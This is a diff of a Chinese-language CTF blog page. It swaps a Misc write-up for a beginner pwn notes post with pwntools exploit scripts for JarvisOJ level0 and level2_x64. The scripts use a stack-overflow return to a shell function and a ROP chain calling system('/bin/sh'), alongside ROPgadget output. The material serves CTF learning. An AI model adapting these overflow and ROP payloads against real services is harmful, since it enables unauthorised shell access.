@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF-Misc," />
+  <meta name="keywords" content="二进制安全、pwn," />
 
 
 
@@ -96,22 +96,18 @@
 
 
 
-<meta name="description" content="水一水  JarvisOJ  basic_help!!  afctf 数据恢复2">
-<meta name="keywords" content="CTF-Misc">
+<meta name="description" content="Linux-x64  JarvisOJ-Pwn-level0  JarvisOJ-Pwn-level2_x64  JarvisOJ-Pwn-level3_x64  原理 待施工  题目JarvisOJ level0​    发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a’ + “\x96\x05">
+<meta name="keywords" content="二进制安全、pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【Misc】题目集合">
-<meta property="og:url" content="http://yoursite.com/【Misc】题目集合/index.html">
+<meta property="og:title" content="【pwn】入门笔记2">
+<meta property="og:url" content="http://yoursite.com/【pwn】入门笔记2/index.html">
 <meta property="og:site_name" content="wyx&#39;s blog">
-<meta property="og:description" content="水一水  JarvisOJ  basic_help!!  afctf 数据恢复2">
+<meta property="og:description" content="Linux-x64  JarvisOJ-Pwn-level0  JarvisOJ-Pwn-level2_x64  JarvisOJ-Pwn-level3_x64  原理 待施工  题目JarvisOJ level0​    发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a’ + “\x96\x05">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/【Misc】题目集合/1532439460327.png">
-<meta property="og:image" content="http://yoursite.com/【Misc】题目集合/1532440354909.png">
-<meta property="og:image" content="http://yoursite.com/【Misc】题目集合/1532440672940.png">
-<meta property="og:updated_time" content="2018-08-06T01:31:35.124Z">
+<meta property="og:updated_time" content="2018-08-06T12:58:56.739Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【Misc】题目集合">
-<meta name="twitter:description" content="水一水  JarvisOJ  basic_help!!  afctf 数据恢复2">
-<meta name="twitter:image" content="http://yoursite.com/【Misc】题目集合/1532439460327.png">
+<meta name="twitter:title" content="【pwn】入门笔记2">
+<meta name="twitter:description" content="Linux-x64  JarvisOJ-Pwn-level0  JarvisOJ-Pwn-level2_x64  JarvisOJ-Pwn-level3_x64  原理 待施工  题目JarvisOJ level0​    发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a’ + “\x96\x05">
 
 
 
@@ -140,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/【Misc】题目集合/"/>
+  <link rel="canonical" href="http://yoursite.com/【pwn】入门笔记2/"/>
 
 
 
 
 
-  <title>【Misc】题目集合 | wyx's blog</title>
+  <title>【pwn】入门笔记2 | wyx's blog</title>
   
 
 
@@ -289,7 +285,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/【Misc】题目集合/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/【pwn】入门笔记2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wyx">
@@ -306,7 +302,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">【Misc】题目集合</h1>
+          <h1 class="post-title" itemprop="name headline">【pwn】入门笔记2</h1>
         
 
         <div class="post-meta">
@@ -318,8 +314,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-24T21:30:56+08:00">
-                2018-07-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-06T16:21:29+08:00">
+                2018-08-06
               </time>
             
 
@@ -334,7 +330,7 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-06T09:31:35+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-06T20:58:56+08:00">
                 2018-08-06
               </time>
             
@@ -368,21 +364,20 @@
       
 
       
-        <h1 id="水一水"><a href="#水一水" class="headerlink" title="水一水"></a>水一水</h1><ul>
-<li style="list-style: none"><input type="checkbox" checked> JarvisOJ  basic_help!!</li>
-<li style="list-style: none"><input type="checkbox"> afctf 数据恢复2</li>
+        <h1 id="Linux-x64"><a href="#Linux-x64" class="headerlink" title="Linux-x64"></a>Linux-x64</h1><ul>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level0</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level2_x64</li>
+<li style="list-style: none"><input type="checkbox"> JarvisOJ-Pwn-level3_x64</li>
 </ul>
-<a id="more"></a>
-<h2 id="JarvisOJ-basic-help"><a href="#JarvisOJ-basic-help" class="headerlink" title="JarvisOJ  basic_help!!"></a>JarvisOJ  basic_help!!</h2><p>​    打开压缩包发现有加密，但是拖到爆破软件中未能得到密码，查找资料发现可能是伪加密。用010editor查看文件，并修改二进制文件。修改结果如下，也就是将ushort deFlags的值将09改为00</p>
-<img src="/【Misc】题目集合/1532439460327.png" title="help!!_1">
-<p>​    进行了这个修改之后，就可以直接将压缩文件解压，是一个word文件，打开如下</p>
-<img src="/【Misc】题目集合/1532440354909.png" title="help!!_2">
-<p>​    考虑这是一种word隐写（关于word隐写的各种类型和破解方法详看这个博客<a href="https://blog.csdn.net/drondong/article/details/79322799" target="_blank" rel="noopener">https://blog.csdn.net/drondong/article/details/79322799</a>  ），而这个word的隐写方式为博客中的第三种，解压后得到几个文件夹，最后在word&gt;media中找到了flag如下</p>
-<img src="/【Misc】题目集合/1532440672940.png" title="help!!_3">
-<h2 id="afctf-数据恢复2"><a href="#afctf-数据恢复2" class="headerlink" title="afctf 数据恢复2"></a>afctf 数据恢复2</h2><p>​    打开压缩包发现有大量的文件夹，文件夹最底层才是可能存在flag的txt文件，编写脚本提取字符串并输出flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r'C:\Users\Max_Wang\Documents\CTF\Challenge\Misc\temp'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(path,topdown=<span class="keyword">False</span>):</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">        temp = os.path.join(root,name)</span><br><span class="line">        <span class="keyword">if</span> temp.endswith(<span class="string">'.txt'</span>):</span><br><span class="line">            f = open(temp)</span><br><span class="line">            text = f.read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'afctf'</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">print</span> text</span><br></pre></td></tr></table></figure>
-<p>​    得到flag</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afctf&#123;Traver31ng_the_d1rect0ry&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p>待施工</p>
+</blockquote>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="JarvisOJ-level0"><a href="#JarvisOJ-level0" class="headerlink" title="JarvisOJ level0"></a>JarvisOJ level0</h3><p>​    发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a’ + “\x96\x05\x40\x00”，于是用pwntools编写攻击代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9881'</span>)</span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="string">"\x96\x05\x40\x00"</span></span><br><span class="line"><span class="comment">#addr  = p64(0x400596)</span></span><br><span class="line"><span class="comment">#payload = 0x88*'a'</span></span><br><span class="line"><span class="comment">#payload = payload+addr</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="JarvisOJ-level2-x64"><a href="#JarvisOJ-level2-x64" class="headerlink" title="JarvisOJ level2_x64"></a>JarvisOJ level2_x64</h3><p>​    由于x64并不直接由栈传参，而是通过寄存器，所以这道题目和x86最大的不同在于要找到pop rdi; ret这个gadget，首先通过ROPgadget查找pop rdi; ret。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/wyx/JarvisOJ-pwn-level2_x64$ ROPgadget --binary level2_x64 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400560 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004a1 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
+<p>​    可以看到pop rdi; ret的地址为0x00000000004006b3，所以编写exp.py函数如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)</span><br><span class="line">level2 = ELF(<span class="string">'level2_x64'</span>)</span><br><span class="line">system_addr = level2.plt[<span class="string">'system'</span>]</span><br><span class="line">pr_addr = <span class="number">0x4006b3</span></span><br><span class="line">binsh_addr = <span class="number">0x600A90</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pr_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -400,7 +395,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/CTF-Misc/" rel="tag"># CTF-Misc</a>
+            <a href="/tags/二进制安全、pwn/" rel="tag"># 二进制安全、pwn</a>
           
         </div>
       
@@ -413,8 +408,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/【Reverse】Cpp集合/" rel="next" title="【Reverse】Cpp集合">
-                <i class="fa fa-chevron-left"></i> 【Reverse】Cpp集合
+              <a href="/【diary】2018-8/" rel="next" title="【diary】2018/8">
+                <i class="fa fa-chevron-left"></i> 【diary】2018/8
               </a>
             
           </div>
@@ -422,10 +417,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/【Crypto】RSA集合/" rel="prev" title="【Crypto】RSA集合">
-                【Crypto】RSA集合 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -579,7 +570,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#水一水"><span class="nav-text">水一水</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JarvisOJ-basic-help"><span class="nav-text">JarvisOJ  basic_help!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#afctf-数据恢复2"><span class="nav-text">afctf 数据恢复2</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-x64"><span class="nav-text">Linux-x64</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level0"><span class="nav-text">JarvisOJ level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level2-x64"><span class="nav-text">JarvisOJ level2_x64</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
